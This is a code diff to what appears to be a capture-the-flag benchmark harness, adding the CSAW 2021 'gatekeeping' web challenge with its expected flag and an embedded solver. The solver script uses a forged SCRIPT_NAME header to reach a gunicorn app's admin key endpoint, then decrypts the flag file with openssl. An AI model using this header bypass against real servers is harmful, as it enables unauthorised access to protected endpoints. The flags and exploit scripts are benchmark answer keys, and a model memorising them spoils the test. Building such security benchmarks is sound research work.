@@ -242,6 +242,58 @@ session.get(urljoin(static_images, flag_img_name), timeout=5).raise_for_status()
 print("Flag: csawctf{K3pt_y0u_Wa1t1ng_HUh}")
 """,
     ),
+    "2021q-web-gatekeeping": ChallengeSpec(
+        challenge_id="2021q-web-gatekeeping",
+        rel=Path("test/2021/CSAW-Quals/web/gatekeeping"),
+        port=12345,
+        probe_path="/",
+        expected_flag="flag{gunicorn_probably_should_not_do_that}",
+        note="gunicorn SCRIPT_NAME header leaks AES flag key",
+        split="test",
+        exploit_timeout=45.0,
+        exploit_script=r"""
+import binascii
+import os
+import subprocess
+import time
+from pathlib import Path
+from urllib.parse import urljoin
+
+import requests
+
+base = f"http://{os.environ['LOTUS_TARGET_HOST']}:{os.environ['LOTUS_TARGET_PORT']}/"
+challenge_dir = Path(os.environ["LOTUS_CHALLENGE_DIR"])
+headers = {
+    "key_id": "05d1dc92ce82cc09d9d7ff1ac9d5611d",
+    "SCRIPT_NAME": "asdf/",
+}
+last = None
+for _ in range(30):
+    try:
+        res = requests.get(urljoin(base, "asdf/admin/key"), headers=headers, timeout=3)
+        if res.status_code == 200:
+            break
+        last = RuntimeError(f"status {res.status_code}: {res.text[:200]}")
+    except requests.RequestException as e:
+        last = e
+    time.sleep(1)
+else:
+    raise RuntimeError(f"key endpoint did not become ready: {last}")
+res.raise_for_status()
+key_hex = res.json()["key"]
+
+data = (challenge_dir / "flag.txt.enc").read_bytes()[16:]
+iv = data[:16]
+ciphertext = data[16:]
+dec = subprocess.run(
+    ["openssl", "enc", "-aes-256-cfb8", "-d", "-K", key_hex, "-iv", binascii.hexlify(iv).decode()],
+    input=ciphertext,
+    capture_output=True,
+    check=True,
+)
+print(dec.stdout.decode("utf-8", "replace"))
+""",
+    ),
 }
 
 
@@ -397,7 +449,13 @@ def _recon(case: Case, scope, spec: ChallengeSpec) -> Any:
     return svc
 
 
-def _exploit(case: Case, scope, svc, spec: ChallengeSpec) -> tuple[bool, BudgetLedger]:
+def _exploit(
+    bench_dir: Path,
+    case: Case,
+    scope,
+    svc,
+    spec: ChallengeSpec,
+) -> tuple[bool, BudgetLedger]:
     flag = FlagEngine(case)
     budget = BudgetLedger(max_tool_invocations=10)
     entity = {
@@ -413,7 +471,13 @@ def _exploit(case: Case, scope, svc, spec: ChallengeSpec) -> tuple[bool, BudgetL
         goal=f"retrieve flag from {spec.challenge_id}",
         tube=TCPTube(TARGET_HOST, spec.port),
         author=None,
-        runner=HostPythonScriptRunner(timeout=spec.exploit_timeout),
+        runner=HostPythonScriptRunner(
+            timeout=spec.exploit_timeout,
+            env={
+                "LOTUS_BENCH_DIR": str(bench_dir),
+                "LOTUS_CHALLENGE_DIR": str(_target_dir(bench_dir, spec)),
+            },
+        ),
         flag=flag,
         budget=budget,
         scope=scope,
@@ -469,7 +533,7 @@ def run_smoke(config: SmokeConfig) -> Dict[str, Any]:
     try:
         case, signer, scope = _seed_case(config, spec)
         svc = _recon(case, scope, spec)
-        solved, budget = _exploit(case, scope, svc, spec)
+        solved, budget = _exploit(config.bench_dir, case, scope, svc, spec)
         anchor = create_anchor(case.store, signer)
         (case.dir / "audit_anchor.json").write_text(
             json.dumps(anchor, indent=2, sort_keys=True) + "\n",
